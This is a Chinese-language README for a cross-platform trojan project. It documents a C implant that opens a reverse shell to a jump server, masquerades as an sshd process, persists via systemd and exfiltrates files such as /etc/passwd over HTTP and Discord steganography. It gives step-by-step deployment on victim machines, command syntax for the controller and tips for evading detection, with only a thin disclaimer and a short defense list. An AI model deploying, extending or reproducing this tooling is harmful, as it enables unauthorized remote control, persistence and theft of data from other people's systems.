# Antivirus-free-Trojan-horse

基于 C 和 Python 的跨平台木马程序，使用反向 Shell、加密通信和 Discord 隐蔽信道实现远程控制。

## ⚠️ 免责声明

**本项目仅供网络安全教育和研究使用。未经授权使用本工具对他人系统进行攻击是违法行为。使用者需自行承担法律责任。**

---

## 📋 项目架构

本木马程序由三层架构组成：

```
受害机 (muma.c) 
    ↓ 反向 Shell + 文件传输
跳板节点 (jump_node.py)
    ↓ 加密转发
控制端 (control_end.py)
```

同时支持 Discord 作为隐蔽信道进行文件外传。

---

## 📁 文件说明

### 1. **muma.c** (主木马程序)
受害机上运行的 C 语言木马，功能包括：
- **反向 Shell**：连接到跳板节点（10.21.196.225:7689）
- **进程伪装**：伪装为 `[sshd]` 系统进程
- **持久化**：创建 systemd 服务实现开机自启动
- **自我复制**：将自身复制到系统目录（/usr/bin、/bin 等）
- **守护进程**：父进程监控子进程，异常退出后自动重启
- **动态生成 Python 脚本**：
  - 生成 `discord_send.py`（Discord 文件外传）
  - 生成 `send_files.py`（HTTP 文件传输）

### 2. **jump_node.py** (跳板服务器)
运行在跳板机上的转发服务器，功能包括：
- **双端口监听**：
  - 7689 端口：接收反向 Shell 连接
  - 80 端口：接收 HTTP 文件传输
- **流量转发**：将受害机流量转发到控制端（10.21.249.131）
- **加密通信**：使用 RSA + AES 混合加密
- **IP 管理**：维护在线受害机列表，实时通知控制端

### 3. **control_end.py** (控制端)
攻击者使用的控制台程序，功能包括：
- **命令分发**：向指定 IP 或所有受害机发送 Shell 命令
- **接收回显**：通过跳板节点接收命令执行结果
- **文件接收**：解密并保存受害机传输的文件
- **在线监控**：实时显示所有在线受害机 IP

### 4. **discord_send.py** (Discord 隐蔽信道)
由 `muma.c` 动态生成，功能：
- 监听 Discord 频道消息
- 接收 `$filepath <文件路径>` 命令
- 通过三种方式随机发送文件：
  - 文本消息（Base64 编码）
  - 图片隐写术（LSB 隐写）
  - 文件附件

### 5. **discordrecvbot.py** (Discord 接收端)
攻击者运行的 Discord Bot，功能：
- 接收并解密 Discord 频道中的文件数据
- 支持三种接收方式：文本、图片隐写、文件附件
- 自动拼接分块数据并解码为原始文件

### 6. **send_files.py** (HTTP 文件传输)
由 `muma.c` 动态生成，功能：
- 将文件分块通过 HTTP POST 发送到跳板节点（80 端口）
- 使用自定义 Base64 编码表混淆流量
- 伪造 HTTP 头（Host: baidu.com）隐藏真实目标

### 7. **requirements.txt**
Python 依赖：
```
discord.py
Pillow
cryptography
```

---

## 🔑 密钥配置说明

### **关键行密钥填写说明**

#### 1. **discordrecvbot.py - 第 72、73、199 行**

```python
72| # client.run('client-secret')
73| # here is your client-secret
...
199| client.run('your-client-secret')
```

**需要填写：Discord Bot Token**

- **获取方式**：
  1. 前往 [Discord Developer Portal](https://discord.com/developers/applications)
  2. 创建应用并添加 Bot
  3. 在 Bot 页面复制 Token
- **填写格式**：`client.run('MTIzNDU2Nzg5MDEyMzQ1Njc4OQ.GaBcDe.fGhIjKlMnOpQrStUvWxYz123456789')`
- **作用**：接收端 Bot 登录 Discord 接收文件数据

---

#### 2. **discord_send.py - 第 105 行**（由 muma.c 第 330 行生成）

```python
330| "client.run('your-remote-secret')\n"
```

**需要填写：Discord Bot Token**

- **获取方式**：同上（可使用不同 Bot 或相同 Bot）
- **填写格式**：直接修改 `muma.c` 第 330 行字符串：
  ```c
  "client.run('MTIzNDU2Nzg5MDEyMzQ1Njc4OQ.XyZaBc.DeFgHiJkLmNoPqRsTuVwXy987654321')\n"
  ```
- **作用**：受害机上的发送端 Bot 登录 Discord 发送文件

---

#### 3. **muma.c - 第 330 行（完整代码）**

```c
330| "client.run('your-remote-secret')\n"
```

**需要修改的完整代码：**
```c
// 第 330 行在 create_discord() 函数内
const char *python_code[] = {
    ...
    "client.run('your-remote-secret')\n"  // 修改这里
};
```

**修改后编译：**
```bash
gcc -o muma muma.c -lpthread
```

---

### **RSA 密钥对说明**

程序中已硬编码 RSA 密钥对，用于跳板节点与控制端的加密通信：

- **公钥**（jump_node.py 第 24-32 行）：
  ```
  -----BEGIN PUBLIC KEY-----
  MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAnv3JFFF0MboYe0afUgIg...
  -----END PUBLIC KEY-----
  ```

- **私钥**（control_end.py 第 18-45 行）：
  ```
  -----BEGIN PRIVATE KEY-----
  MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQCe/ckUUXQxuhh7...
  -----END PRIVATE KEY-----
  ```

**无需修改**，除非你想生成自己的密钥对（需同时修改 jump_node.py 和 control_end.py）。

---

## 🚀 运行方式

### **第一步：部署跳板节点**

在跳板服务器（10.21.196.225）上运行：

```bash
# 安装依赖
pip3 install cryptography

# 运行跳板节点（需要 root 权限绑定 80 端口）
sudo python3 jump_node.py
```

**监听端口：**
- 7689：反向 Shell
- 80：文件传输

---

### **第二步：部署控制端**

在控制机（10.21.249.131）上运行：

```bash
# 安装依赖
pip3 install cryptography

# 运行控制端
python3 control_end.py
```

**功能菜单：**
```
1. Show online IPs       # 查看在线受害机
2. Send command to server # 发送命令
3. Disconnect from server # 断开连接
```

**发送命令格式：**
```
ip=<目标IP>;cmd=<命令>
ip=10.20.1.100;cmd=whoami       # 向指定 IP 发送命令
ip=-a;cmd=uname -a              # 向所有在线主机发送命令
```

---

### **第三步：部署 Discord 接收端（可选）**

```bash
# 安装依赖
pip3 install discord.py Pillow

# 修改 discordrecvbot.py 第 199 行填写 Bot Token
# 运行接收 Bot
python3 discordrecvbot.py
```

---

### **第四步：在受害机上部署木马**

```bash
# 编译木马（需要修改 muma.c 第 330 行的 Discord Token）
gcc -o muma muma.c -lpthread

# 运行木马（需要 root 权限）
sudo ./muma
```

**木马执行流程：**
1. 伪装进程名为 `[sshd]`
2. 创建 systemd 服务（`d.service`）实现开机自启动
3. 生成 `discord_send.py` 和 `send_files.py`
4. 将自身复制到系统目录（/usr/bin/.hidden_trojan 等）
5. 启动反向 Shell 连接到跳板节点（10.21.196.225:7689）
6. 启动守护进程监控子进程

---

### **第五步：使用 Discord 外传文件（可选）**

在受害机上运行（木马已自动生成 discord_send.py）：

```bash
# 安装依赖
pip3 install discord.py Pillow

# 修改 discord_send.py 第 330 行填写 Bot Token（或重新编译 muma.c）
# 运行发送 Bot
python3 discord_send.py
```

在 Discord 频道发送命令：
```
$filepath /etc/passwd
```

Bot 会自动读取文件并通过文本/图片/附件随机方式发送到频道。

---

## 📡 通信流程

### **Shell 命令执行流程**

```
控制端 (control_end.py)
    ↓ 发送: ip=10.20.1.100;cmd=whoami
跳板节点 (jump_node.py)
    ↓ 解析并转发命令: whoami
受害机 (muma.c)
    ↓ 执行命令并返回结果
跳板节点 (jump_node.py)
    ↓ 加密: RSA(AES_KEY) + AES(结果 + "from ip: 10.20.1.100")
控制端 (control_end.py)
    ↓ 解密并显示结果
```

---

### **文件传输流程**

```
受害机运行: python3 send_files.py /etc/passwd 10.21.196.225
    ↓ 分块 + 自定义 Base64 编码 + 伪造 HTTP 头
跳板节点 80 端口接收
    ↓ 解码并加密: RSA(AES_KEY) + AES(文件数据)
控制端接收
    ↓ 解密并保存到 ./received_files/
```

---

## 🔒 加密机制

1. **跳板→控制端**：RSA-2048 加密 AES-256 密钥，AES-CFB 模式加密数据
2. **文件传输**：自定义 Base64 编码表混淆流量
3. **Discord 传输**：标准 Base64 编码 + LSB 图片隐写术

---

## 🛡️ 防御措施

- 监控异常进程（伪装为 sshd）
- 检测 systemd 服务异常（d.service）
- 监控网络连接到 7689 端口
- 检测 Discord Bot 异常流量
- 监控系统目录中的隐藏文件（.hidden_trojan）

---

## 📝 开发建议

1. **修改通信端口**：避免使用默认 7689 端口
2. **更换加密密钥**：生成新的 RSA 密钥对
3. **自定义进程名**：修改伪装进程名称
4. **修改 Base64 编码表**：增强流量混淆

---

## 📄 License

本项目仅供教育用途，请勿用于非法活动。